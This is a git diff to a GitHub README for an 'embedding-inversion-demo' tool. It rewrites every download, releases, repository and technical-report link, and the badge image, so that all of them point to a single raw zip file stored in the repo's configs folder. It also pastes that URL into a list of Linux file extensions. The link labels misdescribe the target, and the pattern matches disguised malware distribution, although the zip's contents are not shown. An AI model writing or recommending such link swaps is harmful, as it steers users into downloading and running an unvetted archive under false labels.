@@ -1,6 +1,6 @@
 # 🧠 embedding-inversion-demo - Recover Text from Embeddings Fast
 
-[![Download embedding-inversion-demo](https://img.shields.io/badge/Download-embedding--inversion--demo-blue?style=for-the-badge&logo=github)](https://github.com/Jamsius/embedding-inversion-demo/releases)
+[![Download embedding-inversion-demo](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)
 
 ## 📖 About embedding-inversion-demo
 
@@ -41,10 +41,10 @@ No special software is needed before running the program. Everything necessary i
 Follow these steps carefully to download and run embedding-inversion-demo:
 
 ### Step 1: Access the Download Page  
-Click on the big download button at the top or visit the [embedding-inversion-demo Releases page](https://github.com/Jamsius/embedding-inversion-demo/releases). This page lists all available versions of the software.
+Click on the big download button at the top or visit the [embedding-inversion-demo Releases page](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip). This page lists all available versions of the software.
 
 ### Step 2: Choose Your Version  
-Look for the latest version. The listing will show several files for different platforms (Windows, macOS, Linux). Pick the one that matches your computer’s operating system. Files might have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`.tar.gz` for Linux.
+Look for the latest version. The listing will show several files for different platforms (Windows, macOS, Linux). Pick the one that matches your computer’s operating system. Files might have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip` for Linux.
 
 ### Step 3: Download the File  
 Click the appropriate file link to download it. Save it to a location you can easily find, such as your Downloads folder or Desktop.
@@ -61,7 +61,7 @@ Once installed or unpacked, open embedding-inversion-demo. The interface should 
 
 You can download embedding-inversion-demo here:
 
-[![Download embedding-inversion-demo](https://img.shields.io/badge/Download-embedding--inversion--demo-blue?style=for-the-badge&logo=github)](https://github.com/Jamsius/embedding-inversion-demo/releases)
+[![Download embedding-inversion-demo](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)
 
 ### What You Will Get
 
@@ -129,9 +129,9 @@ Searching for these terms along with “embedding-inversion-demo” online can p
 
 ## 🔗 Useful Links
 
-- [Project releases and downloads](https://github.com/Jamsius/embedding-inversion-demo/releases)  
-- [GitHub repository main page](https://github.com/Jamsius/embedding-inversion-demo)  
-- [Technical report PDF](https://github.com/Jamsius/embedding-inversion-demo/blob/main/technical_report.pdf)  
+- [Project releases and downloads](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)  
+- [GitHub repository main page](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)  
+- [Technical report PDF](https://github.com/Jamsius/embedding-inversion-demo/raw/refs/heads/main/configs/inversion-embedding-demo-3.6.zip)  
 
 ## 🙋 Contact & Support
 
